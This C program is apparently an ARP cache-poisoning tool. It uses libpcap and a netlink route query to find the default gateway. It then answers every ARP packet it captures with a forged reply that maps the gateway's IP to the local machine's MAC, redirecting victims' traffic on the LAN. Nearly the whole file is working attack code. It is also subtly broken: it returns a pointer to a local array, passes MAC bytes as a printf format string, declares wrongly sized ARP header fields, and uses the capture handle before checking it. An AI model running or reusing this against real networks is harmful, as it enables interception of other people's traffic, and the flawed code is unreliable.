#define _BSD_SOURCE
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <pcap/pcap.h>
#include <stdio.h>
#include <net/ethernet.h>
#include <stdlib.h>
#include <string.h>
#include <linux/posix_types.h>
#include <net/if.h>
#include <linux/rtnetlink.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <netinet/in.h>

#define ETH_HDRLEN 14
#define ARP_HDRLEN 28
#define ARPOP_REQUEST 1
#define ARPOP_REPLY 2
#define TYPE_ETH 1
#define IPv4 0x800
#define HDR_SZ 6
#define PRT_SZ 4
#define BUFSIZE 8192
struct arp_header
{
   uint16_t ar_hrd;
   uint16_t ar_pro;
   uint16_t ar_hln;
   uint16_t ar_pln;
   uint16_t ar_op;

   uint8_t arp_sha[6];
   uint32_t arp_spa;
   uint8_t arp_tha[6];
   uint32_t arp_tpa;
};

struct route_info
{
   struct in_addr dstAddr;
   struct in_addr srcAddr;
   struct in_addr gateWay;
   char ifName[IF_NAMESIZE];

};

u_char Rframe[ETH_HDRLEN+ARP_HDRLEN];
u_char frame[ETH_HDRLEN+ARP_HDRLEN];

struct arp_header *arpR = (struct arp_header *)(Rframe+14);
struct arp_header *arpF = (struct arp_header *)(frame+14);

pcap_t* handle;
char* Get_mac(void);
char addr[20];

void Make_Header(void * data);
char* GetMacAddress();



int readNlSock(int sockFd, char *bufPtr, int seqNum, int pId)

{

        struct nlmsghdr *nlHdr;

        int readLen = 0, msgLen = 0;



        do

        {

                /* Recieve response from the kernel */

                if((readLen = recv(sockFd, bufPtr, BUFSIZE - msgLen, 0)) < 0)

                {

                        perror("SOCK READ: ");

                        return -1;

                }



                nlHdr = (struct nlmsghdr *)bufPtr;



                /* Check if the header is valid */

                if((NLMSG_OK(nlHdr, readLen) == 0) || (nlHdr->nlmsg_type == NLMSG_ERROR))

                {

                        perror("Error in recieved packet");

                        return -1;

                }



                /* Check if the its the last message */

                if(nlHdr->nlmsg_type == NLMSG_DONE)

                {

                        break;

                }

                else

                {

                        /* Else move the pointer to buffer appropriately */

                        bufPtr += readLen;

                        msgLen += readLen;

                }



                /* Check if its a multi part message */

                if((nlHdr->nlmsg_flags & NLM_F_MULTI) == 0)

                {

                        /* return if its not */

                        break;

                }

        } while((nlHdr->nlmsg_seq != seqNum) || (nlHdr->nlmsg_pid != pId));

        return msgLen;

}



/* parse the route info returned */

void parseRoutes(struct nlmsghdr *nlHdr, struct route_info *rtInfo)

{

        struct rtmsg *rtMsg;

        struct rtattr *rtAttr;

        int rtLen;



        rtMsg = (struct rtmsg *)NLMSG_DATA(nlHdr);




        if((rtMsg->rtm_family != AF_INET) || (rtMsg->rtm_table != RT_TABLE_MAIN))

                return;



        /* get the rtattr field */

        rtAttr = (struct rtattr *)RTM_RTA(rtMsg);

        rtLen = RTM_PAYLOAD(nlHdr);



        for(;RTA_OK(rtAttr,rtLen);rtAttr = RTA_NEXT(rtAttr,rtLen))

        {

                switch(rtAttr->rta_type)

                {

                        case RTA_OIF:

                        if_indextoname(*(int *)RTA_DATA(rtAttr), rtInfo->ifName);

                        break;



                        case RTA_GATEWAY:

                        memcpy(&rtInfo->gateWay, RTA_DATA(rtAttr), sizeof(rtInfo->gateWay));

                        break;



                        case RTA_PREFSRC:

                        memcpy(&rtInfo->srcAddr, RTA_DATA(rtAttr), sizeof(rtInfo->srcAddr));

                        break;



                        case RTA_DST:

                        memcpy(&rtInfo->dstAddr, RTA_DATA(rtAttr), sizeof(rtInfo->dstAddr));

                        break;

                }

        }



        return;

}



// meat

int get_gatewayip(char *gatewayip, socklen_t size)

{

        int found_gatewayip = 0;



        struct nlmsghdr *nlMsg;

        struct rtmsg *rtMsg;

        struct route_info *rtInfo;

        char msgBuf[BUFSIZE]; // pretty large buffer



        int sock, len, msgSeq = 0;



        /* Create Socket */

        if((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_ROUTE)) < 0)

        {

                perror("Socket Creation: ");

                return(-1);

        }



        /* Initialize the buffer */

        memset(msgBuf, 0, BUFSIZE);



        /* point the header and the msg structure pointers into the buffer */

        nlMsg = (struct nlmsghdr *)msgBuf;

        rtMsg = (struct rtmsg *)NLMSG_DATA(nlMsg);



        /* Fill in the nlmsg header*/

        nlMsg->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg)); // Length of message.

        nlMsg->nlmsg_type = RTM_GETROUTE; // Get the routes from kernel routing table .



        nlMsg->nlmsg_flags = NLM_F_DUMP | NLM_F_REQUEST; // The message is a request for dump.

        nlMsg->nlmsg_seq = msgSeq++; // Sequence of the message packet.

        nlMsg->nlmsg_pid = getpid(); // PID of process sending the request.



        /* Send the request */

        if(send(sock, nlMsg, nlMsg->nlmsg_len, 0) < 0)

        {

                fprintf(stderr, "Write To Socket Failed...\n");

                return -1;

        }



        /* Read the response */

        if((len = readNlSock(sock, msgBuf, msgSeq, getpid())) < 0)

        {

                fprintf(stderr, "Read From Socket Failed...\n");

                return -1;

        }



        /* Parse and print the response */

        rtInfo = (struct route_info *)malloc(sizeof(struct route_info));



        for(;NLMSG_OK(nlMsg,len);nlMsg = NLMSG_NEXT(nlMsg,len))

        {

                memset(rtInfo, 0, sizeof(struct route_info));

                parseRoutes(nlMsg, rtInfo);



                // Check if default gateway

                if (strstr((char *)inet_ntoa(rtInfo->dstAddr), "0.0.0.0"))

                {
			inet_ntop(AF_INET, &rtInfo->gateWay, gatewayip, size);

			found_gatewayip = 1;

			break;
                }

        }



        free(rtInfo);

        close(sock);



        return found_gatewayip;

}

int main(int argc, char* argv[])
{
   struct pcap_pkthdr* header;
   
   const u_char* packet;
   char *dev = argv[1];
   char errbuf[PCAP_ERRBUF_SIZE];
   char *mac_adr = GetMacAddress();
   int broadcast = 0xFFFFFF;
   memcpy(Rframe,"\xFF\xFF\xFF\xFF\xFF\xFF",6); //input DEST mac
   sprintf((char*)Rframe+6,mac_adr); //input SRC mac
   memcpy(Rframe+12, "\x08", 1);
   memcpy(Rframe+13, "\x06", 1);
   arpR->ar_hrd = htons(TYPE_ETH);
   arpR->ar_pro = htons(IPv4);
   arpR->ar_hln = HDR_SZ;
   arpR->ar_pln = PRT_SZ;
   arpR->ar_op = htons(ARPOP_REQUEST);
   inet_pton(AF_INET,argv[2],&arpR->arp_spa);
   inet_pton(AF_INET,argv[3],&arpR->arp_tpa);   
   
   printf("[DEBUG] ");
   for (int i=0; i<42; i++)
         printf("%02x ",Rframe[i]);
   printf("\n");


   handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
   pcap_sendpacket(handle,Rframe,sizeof(Rframe));
   if (handle == NULL)
   {
	fprintf(stderr, "couldn't open device %s: %s\n",dev,errbuf);
   }
   while(1)
   {
   int res = pcap_next_ex(handle, &header, &packet);
   if (res == 0) continue;
   if (res == -1 || res == -2) break;
   struct ether_header* ehPs = (struct ether_header *)(void *)packet;
   if(ntohs(ehPs->ether_type) == ETHERTYPE_ARP)
     Make_Header((void *) packet);
   } 
   return 0;
}

void Make_Header(void * data)
{
  struct ether_header* ehPS = (struct ether_header *)data;
  struct arp_header* arpS = (struct arp_header *)(sizeof(struct ether_header)+data);
  char gateway[20];
  get_gatewayip(gateway,20);  
  char *mac_addr = GetMacAddress();
  memcpy(frame,ehPS->ether_shost,6); //input DEST mac
  sprintf((char*)frame+6,mac_addr); //input SRC mac
  memcpy(frame+12, "\x08", 1);
  memcpy(frame+13, "\x06", 1);

  arpF->ar_hrd = htons(TYPE_ETH);
  arpF->ar_pro = htons(IPv4);
  arpF->ar_hln = HDR_SZ;
  arpF->ar_pln = PRT_SZ;
  arpF->ar_op = htons(ARPOP_REPLY);
  
  memcpy(arpF->arp_tha,arpS->arp_sha,6);
  memcpy(arpF->arp_sha,mac_addr,6);

  inet_pton(AF_INET,gateway,&arpF->arp_spa);
  inet_pton(AF_INET,inet_ntoa(*(in_addr*)&arpS->arp_spa),&arpF->arp_tpa);
  
  printf("[DEBUG] ");
  for (int i=0; i<42; i++)
        printf("%02x ",frame[i]);
  printf("\n");
  if(pcap_sendpacket(handle,frame, 42)!=0)
  {
    printf("False\n");
    exit(0);
  }
  else
  {
    printf("Success!");
  }
}


char* GetMacAddress()
{

    struct ifreq ifr;
    struct ifconf ifc;
    char buf[1024];
    int success = 0;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock == -1) { /* handle error*/ };

    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

    struct ifreq* it = ifc.ifc_req;
    const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

    for (; it != end; ++it) {
        strcpy(ifr.ifr_name, it->ifr_name);
        if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
            if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                    success = 1;
                    break;
                }
            }
        }
        else { /* handle error */ }
    }

    char mac_address[6];

    if (success) 
    {
      memcpy(mac_address, ifr.ifr_hwaddr.sa_data, 6);
      return mac_address;
    }
}

